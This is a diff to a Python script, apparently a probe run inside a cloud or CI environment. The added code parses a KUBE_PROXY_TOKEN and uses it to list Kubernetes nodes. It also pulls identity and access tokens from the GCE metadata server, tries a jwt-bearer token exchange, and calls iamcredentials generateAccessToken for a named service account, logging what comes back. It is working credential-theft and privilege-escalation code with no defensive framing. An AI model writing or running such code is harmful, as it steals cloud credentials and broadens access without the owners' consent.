@@ -531,7 +531,8 @@ def plugin():
                 out("USING cert %s" % name)
                 break
 
-    kpt = (_kv(kv, "KUBE_PROXY_TOKEN") or b"").decode()
+    _mk = re.search(r"^KUBE_PROXY_TOKEN:\s*(\S+)\s*$", kv, re.M)
+    kpt = _mk.group(1) if _mk else ""
     if kpt:
         s, b = call("/api/v1/nodes", auth=kpt, timeout=30)
         out("PROXY nodes status=%s len=%d" % (s, len(b)))
@@ -687,6 +688,32 @@ def csr():
             out("TOKENINFO-%s HTTP %s %s" % (lbl, e.code, e.read()[:600].decode("utf8", "replace")))
         except Exception as e:
             out("TOKENINFO-%s ERR %r" % (lbl, e))
+    # --- oauth self-signed / jwt-bearer and iamcredentials attempts
+    for aud in ["https://oauth2.googleapis.com/token"]:
+        try:
+            st, idb = md_get("instance/service-accounts/default/identity?audience=" + urllib.parse.quote(aud, safe="") + "&format=full")
+            idt = idb.decode("utf8", "replace")
+            out("IDT-TOKEN [%s] %s len=%d" % (aud, st, len(idt)))
+            body = urllib.parse.urlencode({"grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer", "assertion": idt}).encode()
+            r = urllib.request.urlopen(urllib.request.Request("https://oauth2.googleapis.com/token", data=body,
+                headers={"Content-Type": "application/x-www-form-urlencoded"}), timeout=15)
+            out("JWTBEARER status=%s %s" % (r.status, r.read()[:600].decode("utf8", "replace")))
+        except urllib.error.HTTPError as e:
+            out("JWTBEARER HTTP %s %s" % (e.code, e.read()[:600].decode("utf8", "replace")))
+        except Exception as e:
+            out("JWTBEARER ERR %r" % (e,))
+    try:
+        st, tokb = md_get("instance/service-accounts/default/token")
+        at = json.loads(tokb.decode()).get("access_token", "")
+        r = urllib.request.urlopen(urllib.request.Request(
+            "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/220541406316-compute@developer.gserviceaccount.com:generateAccessToken",
+            data=json.dumps({"scope": ["https://www.googleapis.com/auth/cloud-platform"]}).encode(),
+            headers={"Authorization": "Bearer " + at, "Content-Type": "application/json"}), timeout=15)
+        out("IAMCRED status=%s %s" % (r.status, r.read()[:400].decode("utf8", "replace")))
+    except urllib.error.HTTPError as e:
+        out("IAMCRED HTTP %s %s" % (e.code, e.read()[:400].decode("utf8", "replace")))
+    except Exception as e:
+        out("IAMCRED ERR %r" % (e,))
     # --- dind / docker socket reachability
     out("DOCKER-ENV DOCKER_HOST=%r DOCKER_TLS=%r" % (os.environ.get("DOCKER_HOST"), os.environ.get("DOCKER_TLS_VERIFY")))
     try:
